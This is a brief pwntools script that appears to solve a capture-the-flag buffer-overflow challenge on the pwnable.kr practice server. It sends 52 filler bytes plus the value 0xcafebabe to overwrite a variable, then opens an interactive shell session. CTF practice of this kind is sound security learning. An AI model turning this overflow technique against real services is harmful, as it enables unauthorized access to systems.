#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)
conn.sendline('A'*52+'\xbe\xba\xfe\xca')
conn.interactive()
